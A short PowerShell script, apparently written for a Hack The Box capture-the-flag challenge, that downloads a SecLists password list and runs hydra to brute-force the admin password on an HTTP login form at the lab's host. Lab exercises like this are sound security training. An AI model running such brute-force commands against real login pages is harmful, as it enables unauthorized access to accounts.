#$pwdlist = (Invoke-WebRequest https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Most-Popular-Letter-Passes.txt -ContentType txt).Content
$ip = Resolve-DnsName docker.hackthebox.eu | Select -expand IPAddress 
$port = 80

wsl sudo wget -O mostpopular.txt raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Most-Popular-Letter-Passes.txt 
wsl hydra -l admin -P ./mostpopular.txt $ip http-post-form "/:password=^PASS^:Invalid password!" -s $port -t 64

#You'll need to grab and repeat this request in a proxy like zap to get the flag.